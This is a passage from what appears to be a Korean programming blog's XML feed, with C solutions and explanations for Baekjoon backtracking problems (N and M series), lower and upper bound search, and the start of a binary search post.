class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4 2</span><br></pre></td></tr></table></figure></li><li><p>output </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1 2</span><br><span class="line">1 3</span><br><span class="line">1 4</span><br><span class="line">2 3</span><br><span class="line">2 4</span><br><span class="line">3 4</span><br></pre></td></tr></table></figure></li><li><p>이 전 문제와 다르게 오름차순이 아닌 경우면 출력을 하지 않는다.</p></li></ul><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> data[<span class="number">10</span>];</span><br><span class="line"><span class="type">bool</span> visit[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DFS</span><span class="params">(<span class="type">int</span> depth, <span class="type">int</span> pre)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (depth == m+<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// print</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; i++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, data[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (visit[i] == <span class="literal">false</span> &amp;&amp; pre &lt; i) &#123;</span><br><span class="line">                data[depth] = i;</span><br><span class="line">                visit[i] = <span class="literal">true</span>;</span><br><span class="line">                DFS(depth+<span class="number">1</span>, i);</span><br><span class="line">                visit[i] = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">    DFS(<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>이 전 코드에서 <code>pre &lt; i</code> 조건을 추가해주었다. 이때 주의해야할 점은 pre가 등장했기 때문에 main 함수에서 depth 1부터 탐색한다. 즉 data 배열을 인덱스 1부터 사용한다. 그래서 출력할 때 <code>for (int i = 1; i &lt;= m; i++)</code> 조건으로 해야한다.</p><h2 id="백준-15651-N과-M-3"><a href="#백준-15651-N과-M-3" class="headerlink" title="백준 15651 N과 M (3)"></a>백준 15651 N과 M (3)</h2><ul><li><p><a href="https://www.acmicpc.net/problem/15651">https://www.acmicpc.net/problem/15651</a></p></li><li><p>1부터 N까지 자연수 중에서 M개를 고른 수열. <strong>중복 허용</strong></p></li><li><p>input</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4 2</span><br></pre></td></tr></table></figure></li><li><p>output</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1 1</span><br><span class="line">1 2</span><br><span class="line">1 3</span><br><span class="line">1 4</span><br><span class="line">2 1</span><br><span class="line">2 2</span><br><span class="line">2 3</span><br><span class="line">2 4</span><br><span class="line">3 1</span><br><span class="line">3 2</span><br><span class="line">3 3</span><br><span class="line">3 4</span><br><span class="line">4 1</span><br><span class="line">4 2</span><br><span class="line">4 3</span><br><span class="line">4 4</span><br></pre></td></tr></table></figure></li><li><p><code>N과 M (1)</code> 문제와 비교해서 중복이 허용되었다. 사실상 이 문제가 구현하기 가장 쉬울 것 같다.</p></li></ul><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> data[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DFS</span><span class="params">(<span class="type">int</span> depth)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (depth == m) &#123;</span><br><span class="line">        <span class="comment">// print</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, data[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            data[depth] = i;</span><br><span class="line">            DFS(depth+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">    DFS(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>조건 없이 모든 것을 다 완전히 탐색하기 때문에 백트래킹 알고리즘은 사용되지 않았다. DFS로 완전탐색한다.</p><h2 id="백준-15652-N과-M-4"><a href="#백준-15652-N과-M-4" class="headerlink" title="백준 15652 N과 M (4)"></a>백준 15652 N과 M (4)</h2><ul><li><p><a href="https://www.acmicpc.net/problem/15652">https://www.acmicpc.net/problem/15652</a></p></li><li><p>1부터 N까지 자연수 중에서 M개를 고른 수열. 중복 허용. <strong>비내림차순</strong></p></li><li><p>input</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4 2</span><br></pre></td></tr></table></figure></li><li><p>output</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1 1</span><br><span class="line">1 2</span><br><span class="line">1 3</span><br><span class="line">1 4</span><br><span class="line">2 2</span><br><span class="line">2 3</span><br><span class="line">2 4</span><br><span class="line">3 3</span><br><span class="line">3 4</span><br><span class="line">4 4</span><br></pre></td></tr></table></figure></li><li><p>길이가 K인 수열 A가 A1 ≤ A2 ≤ … ≤ AK-1 ≤ AK를 만족하면, 비내림차순이라고 한다.</p></li></ul><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> data[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DFS</span><span class="params">(<span class="type">int</span> depth, <span class="type">int</span> pre)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (depth == m+<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// print</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; i++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, data[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (pre &lt;= i) &#123; <span class="comment">// 비내림차순</span></span><br><span class="line">                data[depth] = i;</span><br><span class="line">                DFS(depth+<span class="number">1</span>, i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">   DFS(<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>N과 M (2)에서 오름차순을 구현했다면 쉽게 유망한 조건에 비내림차순을 구현할 수 있다.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://moz1e.tistory.com/15">https://moz1e.tistory.com/15</a> </li><li><a href="https://velog.io/@newon-seoul/%EB%AC%B8%EA%B3%BC%EC%83%9D%EC%9D%B4-%EC%A0%81%EC%96%B4%EB%B3%B4%EB%8A%94-%EB%B0%B1%ED%8A%B8%EB%9E%98%ED%82%B9-%EC%9E%AC%EA%B7%80%EC%99%80-DFS-%EB%A5%BC-%EA%B3%81%EB%93%A4%EC%9D%B8#%E2%91%A1-dfs-%ED%95%A8%EC%88%98">https://velog.io/@newon-seoul/%EB%AC%B8%EA%B3%BC%EC%83%9D%EC%9D%B4-%EC%A0%81%EC%96%B4%EB%B3%B4%EB%8A%94-%EB%B0%B1%ED%8A%B8%EB%9E%98%ED%82%B9-%EC%9E%AC%EA%B7%80%EC%99%80-DFS-%EB%A5%BC-%EA%B3%81%EB%93%A4%EC%9D%B8#%E2%91%A1-dfs-%ED%95%A8%EC%88%98</a></li><li><a href="https://www.acmicpc.net/board/view/53440">https://www.acmicpc.net/board/view/53440</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> Baekjoon </tag>
            
            <tag> Recursion </tag>
            
            <tag> DFS </tag>
            
            <tag> Backtracking </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Algorithm - Lower bound, Upper bound (Baekjoon 10816, C)</title>
      <link href="/230201-algorithm-upper_lower/"/>
      <url>/230201-algorithm-upper_lower/</url>
      
        <content type="html"><![CDATA[<ul><li><p><a href="https://jiravvit.github.io/230123-alrorithm-binsearch/">https://jiravvit.github.io/230123-alrorithm-binsearch/</a> </p></li><li><p>위의 Binary Search에서 파생됨, 따라서 Lower Bound, Upper Bound 알고리즘은 정렬된 배열에 대해 사용이 가능함</p></li><li><p><strong>Binary Search</strong>: 원하는 값 key를 찾는 과정</p></li><li><p><strong>Lower bound</strong>: 원하는 값 key 이상이 처음 나오는 위치를 찾는 과정</p></li><li><p><strong>Upper bound</strong>: 원하는 값 key를 초과한 값이 처음 나오는 위치를 찾는 과정</p></li><li><p>Binary Search는 원하는 값 key가 아니면 보통 -1을 반환함.(이 전 게시글 구현에서는 0을 반환했음.) 하지만 Lower bound와 Upper bound는 어떻게든 적절한 위치를 반환함.</p></li></ul><h2 id="Lower-Bound"><a href="#Lower-Bound" class="headerlink" title="Lower Bound"></a>Lower Bound</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">lower_bound</span><span class="params">(<span class="type">int</span> data[], <span class="type">int</span> n, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> low, high, mid;</span><br><span class="line"></span><br><span class="line">    low = <span class="number">0</span>;</span><br><span class="line">    high = n<span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (low &lt; high) &#123;</span><br><span class="line">        mid = (low+high) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (key &lt;= data[mid]) </span><br><span class="line">            high = mid;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            low = mid + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> high;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>원하는 값 key 이상이면 key도 포함이다. 중복되는 key 중에서 가장 작은 인덱스를 가져온다. Binary search 코드에서 조금만 변형시켜주면 된다. </p><h2 id="Upper-Bound"><a href="#Upper-Bound" class="headerlink" title="Upper Bound"></a>Upper Bound</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">upper_bound</span><span class="params">(<span class="type">int</span> data[], <span class="type">int</span> n, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> low, high, mid;</span><br><span class="line"></span><br><span class="line">    low = <span class="number">0</span>;</span><br><span class="line">    high = n<span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (low &lt; high) &#123;</span><br><span class="line">        mid = (low+high) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (key &lt; data[mid]) </span><br><span class="line">            high = mid;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            low = mid + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> high;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>low</code>, <code>high</code>, <code>mid</code>는 모두 인덱스이다.</p><p><code>key</code>보다 큰 첫 번째 위치를 찾아야 한다. <code>key</code>가 <code>data[mid]</code>보다 작으면 <code>high</code>를 <code>mid</code>로 내린다. 그럼 전체적인 인덱스는 왼쪽으로 살짝 치우친 형태일 것이다.</p><p><code>key</code>가 <code>data[mid]</code>보다 값거나 크면 <code>low = mid + 1</code>을 수행한다. 쉽게 말해 <code>mid</code> 그 다음 인덱스를 <code>low</code>로 지정한다. </p><img src="/images/230201-algoritm-upper_lower/IMG_4027.png" width=500/><br><img src="/images/230201-algoritm-upper_lower/IMG_4028.png" width=500/><br><img src="/images/230201-algoritm-upper_lower/IMG_4029.png" width=500/><p>검정색을 먼저 읽고 빨간색을 읽으면 된다. 파란색은 참고이다.</p><h2 id="Example-백준-10816-숫자카드-2"><a href="#Example-백준-10816-숫자카드-2" class="headerlink" title="Example (백준 10816 숫자카드 2)"></a>Example (백준 10816 숫자카드 2)</h2><ul><li><a href="https://www.acmicpc.net/problem/10816">https://www.acmicpc.net/problem/10816</a></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">compare</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* a, <span class="type">const</span> <span class="type">void</span>* b)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">int</span>*)a &gt; *(<span class="type">int</span>*)b) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (*(<span class="type">int</span>*)a &lt; *(<span class="type">int</span>*)b) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">lower_bound</span><span class="params">(<span class="type">int</span> data[], <span class="type">int</span> n, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> low, high, mid;</span><br><span class="line"></span><br><span class="line">    low = <span class="number">0</span>;</span><br><span class="line">    high = n<span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (low &lt; high) &#123;</span><br><span class="line">        mid = (low+high) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (key &lt;= data[mid]) </span><br><span class="line">            high = mid;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            low = mid + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> high;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">upper_bound</span><span class="params">(<span class="type">int</span> data[], <span class="type">int</span> n, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> low, high, mid;</span><br><span class="line"></span><br><span class="line">    low = <span class="number">0</span>;</span><br><span class="line">    high = n<span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (low &lt; high) &#123;</span><br><span class="line">        mid = (low+high) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (key &lt; data[mid]) </span><br><span class="line">            high = mid;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            low = mid + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (data[high] == key) </span><br><span class="line">        <span class="keyword">return</span> high + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> high;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="type">int</span> arr[n];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d &quot;</span>, &amp;arr[i]);</span><br><span class="line"></span><br><span class="line">    qsort(arr, n, <span class="keyword">sizeof</span>(<span class="type">int</span>), compare);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;m);</span><br><span class="line">    <span class="type">int</span> brr[m];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++)</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d &quot;</span>, &amp;brr[i]);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// lower_bound, upper_bound</span></span><br><span class="line">    <span class="type">int</span> lower, upper;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">        lower = lower_bound(arr, n, brr[i]);</span><br><span class="line">        upper = upper_bound(arr, n, brr[i]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, upper-lower);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>이 문제를 풀기 위해서 <code>upper_bound</code> 함수에서 아래 조건을 추가해줘야한다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (data[high] == key) </span><br><span class="line">    <span class="keyword">return</span> high + <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>왜냐하면.. <code>upper_bound</code> 함수의 반환 값은 key 값을 초과하는 첫 번째 값의 인덱스인데 key가 정렬에서 가장 큰 수라면 반환 값이 존재하지 않기 떄문이다. 그래서 n-1을 반환한다. 이 문제는 key의 개수를 알아내는 것이 목표이기 때문에 해당 경우에만 +1을 해줘야 한다. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10 20 30 30 30 </span><br></pre></td></tr></table></figure><p>예시로 위의 배열에서 30의 개수는 <code>5-2 = 3</code> 이어야 한다.</p>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> binsearch </tag>
            
            <tag> Baekjoon </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Algorithm - Binary Search (C)</title>
      <link href="/230123-alrorithm-binsearch/"/>
      <url>/230123-alrorithm-binsearch/</url>
      
        <content type="html"><![CDATA[<ul><li>정렬된 배열에 대해 사용 가능</li></ul><h2 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">compare</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* a, <span class="type">const</span> <span class="type">void</span>* b)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">int</span>*)a &gt; *(<span class="type">int</span>*)b) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (*(<span class="type">int</span>*)a &lt; *(<span class="type">int</span>*)b) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">binsearch</span><span class="params">(<span class="type">int</span> data[], <span class="type">int</span> n, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> low, high, mid;</span><br><span class="line"></span><br><span class="line">    low = <span class="number">0</span>;</span><br><span class="line">    high = n<span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (low &lt;= high) &#123;</span><br><span class="line">        mid = (low+high) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (key == data[mid]) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (key &lt; data[mid]) high = mid<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (key &gt; data[mid]) low = mid+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, key;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="type">int</span> arr[n];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    qsort(arr, n, <span class="keyword">sizeof</span>(<span class="type">int</span>), compare);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr[j]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;key);</span><br><span class="line">    <span 